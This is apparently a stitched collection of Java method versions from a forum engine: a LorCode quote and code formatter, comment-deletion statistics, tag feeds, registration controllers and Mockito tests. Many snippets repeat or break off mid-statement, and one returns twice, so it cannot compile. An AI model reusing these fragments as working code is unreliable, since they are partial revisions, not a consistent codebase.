public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , toLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , toLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + " [quote] test[/quote] " , toLorCodeTexFormatter . format ( " [code]test[/code] " + " > test " ) ) ; assertEquals ( " [[code]] test " , toLorCodeTexFormatter . format ( " [[code]] test " ) ) ; assertEquals ( " [quote] [[code]] test[/quote] " , 
private String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " ntobr " . equals ( mode ) ) { return toLorCodeFormatter . format ( msg , false ) ; 
public String format ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine + = 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = true ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { if ( globalNestingLevel > 0 ) { line = escapeCode ( line ) ; } else { isCode = false ; } } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , toLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , toLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + " [quote] test[/quote] " , toLorCodeTexFormatter . format ( " [code]test[/code] " + " > test " ) ) ; assertEquals ( " [[code]] test " , toLorCodeTexFormatter . format ( " [[code]] test " ) ) ; assertEquals ( " [quote] [[code]] test[/quote] " , toLorCodeTexFormatter . format ( " > [[code]] test " ) ) ; assertEquals ( " [[code]] test " + 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return toLorCodeFormatter . format ( msg , true ) ; 
public boolean isThreeColumnsOnMain ( ) { return false ; return threeColumnsOnMain; 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) throws ServletException , IOException { if ( filterConfig = = null ) { return ; } HttpServletRequest hsr = ( HttpServletRequest ) servletRequest ; String path = hsr . getServletPath ( ) ; if ( ! path . endsWith ( " .css " ) & & ! path . endsWith ( " .png " ) & & ! path . endsWith ( " .jpg " ) & & ! path . endsWith ( " jpg " ) ) { try { Template tmpl = new Template ( ( HttpServletRequest ) servletRequest , ( HttpServletResponse ) servletResponse , userDao , configuration ) ; servletRequest . setAttribute ( " template " , tmpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
private void updateStatsAfterDelete ( int commentId ) { int topicId = jdbcTemplate . queryForInt ( " SELECT topic FROM comments WHERE id=? " , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-1, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , topicId ) ; int groupId = jdbcTemplate . queryForInt ( " SELECT groupid FROM topics WHERE id = ? " , topicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-1 WHERE id = ? " , groupId ) ; } 
private void updateStatsAfterDelete ( int commentId , int count ) { int topicId = jdbcTemplate . queryForInt ( " SELECT topic FROM comments WHERE id=? " , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , topicId ) ; int groupId = jdbcTemplate . queryForInt ( " SELECT groupid FROM topics WHERE id = ? " , topicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-? WHERE id = ? " , count , groupId ) ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; if ( ! deleted . isEmpty ( ) ) { updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
private List < Integer > doDeleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; if ( ! deleted . isEmpty ( ) ) { updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return doDeleteReplys ( msgid , user , score ) ; } 
public void cleanEvents ( ) { userEventService . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void updateStats ( ) { logger . debug ( " Updating statistics " ) ; statUpdate . execute ( ) ; statMonthly . execute ( ) ; } 
public void updateGroupStats ( ) { logger . debug ( " Updating group statistics " ) ; statUpdate2 . execute ( ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; List < String > javaScriptsForLayout = new ArrayList < String > ( ) ; javaScriptsForLayout . add ( " diff_match_patch.js " ) ; javaScriptsForLayout . add ( " lor_view_diff_history.js " ) ; modelAndView . addObject ( " javascriptsForLayout " , javaScriptsForLayout ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editInfoDTOs . add ( editHistoryDto ) ; } 
public void insert ( EditHistoryDto editHistoryDto ) { editInsert . execute ( new BeanPropertySqlParameterSource ( editHistoryDto ) ) ; } 
public List < EditHistoryDto > loadEditInfo ( int msgid ) { List < EditHistoryDto > list = jdbcTemplate . query ( queryEditInfo , BeanPropertyRowMapper . newInstance ( EditHistoryDto . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public void insert ( EditHistoryDto editHistoryDto ) { editHistoryDao . insert ( editHistoryDto ) ; } 
public boolean apply ( EditHistoryDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public User apply ( EditHistoryDto input ) { try { return userDao . getUserCached ( input . getEditor ( ) ) ; 
public boolean apply ( EditHistoryDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public Integer apply ( EditHistoryDto input ) { return input . getEditor ( ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return CommentRequest . class . equals ( clazz ) ; } 
public void resetUnreadReplies ( int userId ) { jdbcTemplate . update ( UPDATE_RESET_UNREAD_REPLIES , userId ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? AND unread " , userId ) ; } 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return toLorCodeFormatter . format ( msg , true ) ; 
public int addToMemories ( int userid , int topic , boolean watch ) { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM memories WHERE userid=? AND topic=? AND watch=? FOR UPDATE " , Integer . class , userid , topic , watch ) ; if ( res . isEmpty ( ) ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( 
public boolean isUserWatches ( ) { return userWatches ; } 
public void getUserTopicsFeedTest ( ) throws UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( 12345 ) ; List < Topic > topicList = topicListService . getUserTopicsFeed ( user , 123 , true , false ) ; assertEquals ( new Integer ( 20 ) , topicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , topicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , topicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , topicListDto . getUserId ( ) ) ; assertTrue ( topicListDto . isUserFavs ( ) ) ; } 
public void getUserTopicsFeedWithSectionAndGroupTest ( ) throws UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( 12345 ) ; List < Topic > topicList = topicListService . getUserTopicsFeed ( user , section1 , group , 123 , true , false ) ; assertEquals ( 1 , topicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = topicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , topicListDto . getGroup ( ) ) ; assertEquals ( new Integer ( 20 ) , topicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , topicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , topicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , topicListDto . getUserId ( ) ) ; assertTrue ( topicListDto . isUserFavs ( ) ) ; } 
public static Group buildGroup ( ResultSet rs ) throws SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " imagepost " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat1 " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " title " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } return modelAndView ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = topicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; List < TopicListDto . DeletedTopic > deleted = topicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public View tagFeedOld ( TopicListRequest topicListForm ) throws Exception { return new RedirectView ( TAG_URI_TEMPLATE . expand ( topicListForm . getTag ( ) ) . toString ( ) ) ; } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @PathVariable String tag ) throws Exception { topicListForm . setTag ( tag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } return modelAndView ; } 
public View tagFeedOld ( TopicListRequest topicListForm ) throws Exception { return new RedirectView ( tagListUrl ( topicListForm . getTag ( ) ) ) ; } 
public static String tagListUrl ( String tag ) { return TAG_URI_TEMPLATE . expand ( tag ) . toString ( ) ; } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @PathVariable String tag ) throws Exception { topicListForm . setTag ( tag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; return modelAndView ; } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @PathVariable String tag ) throws Exception { topicListForm . setTag ( tag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public void init ( ) { try { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , true , " UTF-8 " ) ; } catch ( Exception e ) { throw new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { throw new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } try { String mainHost = mainURI . getHost ( ) ; if ( mainHost = = null ) { throw new RuntimeException ( ERR_MSG + " bad URI host " ) ; } } catch ( URIException e ) { throw new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } try { secureURI = new URI ( properties . getProperty ( " SecureUrl " , mainURI . toString ( ) . replaceFirst ( " http " , " https " ) ) , true , " UTF-8 " ) ; 
public ModelAndView show ( @ModelAttribute ( " form " ) EditRegisterRequest form , HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; UserInfo userInfo = userDao . getUserInfoClass ( user ) ; ModelAndView mv = new ModelAndView ( " edit-reg " ) ; form . setEmail ( user . getEmail ( ) ) ; form . setUrl ( userInfo . getUrl ( ) ) ; form . setTown ( userInfo . getTown ( ) ) ; form . setName ( user . getName ( ) ) ; form . setInfo ( StringEscapeUtils . unescapeHtml ( userDao . getUserInfo ( user ) ) ) ; response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return mv ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditRegisterValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > aClass ) { return EditRegisterRequest . class . equals ( aClass ) ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletRequest request , HttpServletResponse response ) throws Exception { response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return new ModelAndView ( " register " ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new RegisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditRegisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class aClass ) { return EditRegisterRequest . class . equals ( aClass ) ; } 
public boolean supports ( Class aClass ) { return RegisterRequest . class . equals ( aClass ) ; } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @PathVariable String tag ) throws Exception { topicListForm . setTag ( tag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public int getTagId ( String tag , boolean skipZero ) throws TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( QUERY_TAG_ID_BY_NAME + ( skipZero ? " AND counter>0 " : " " ) , Integer . class , tag ) ; if ( res . isEmpty ( ) ) { throw new TagNotFoundException ( ) ; 
public int getTagId ( String tagName ) throws TagNotFoundException { return getTagId ( tagName , false ) ; } 
public int getTagId ( String tag ) throws UserErrorException , TagNotFoundException { checkTag ( tag ) ; return tagDao . getTagId ( tag , true ) ; } 
public int getCounter ( String tag ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tag ) ; return tagDao . getCounter ( tagId ) ; } 
public View tagFeedOld ( TopicListRequest topicListForm ) { return new RedirectView ( tagListUrl ( topicListForm . getTag ( ) ) ) ; } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @PathVariable String tag ) throws Exception { topicListForm . setTag ( tag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " counter " , tagService . getCounter ( tag ) ) ; modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public void favoriteAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , true ) ; } 
public void favoriteDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , true ) ; } 
public void ignoreAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , false ) ; } 
public void ignoreDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , false ) ; } 
public void changeTest ( ) throws Exception { when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( 123 ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenReturn ( 456 ) ; when ( tagDao . getTagId ( " InvalidTestTag " ) ) . thenThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " #$%@@#%$ " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) throws Exception { when ( tagDao . getTagId ( " InvalidTestTag " ) ) . thenThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " #$%@@#%$ " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) throws Exception { reset ( userTagDao ) ; reset ( tagDao ) ; when ( tagDao . getTagId ( " tag1 " ) ) . thenReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) throws TagNotFoundException { when ( tagDao . getTagId ( " tag1 " ) ) . thenReturn ( 2 ) ; userTagService . favoriteAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
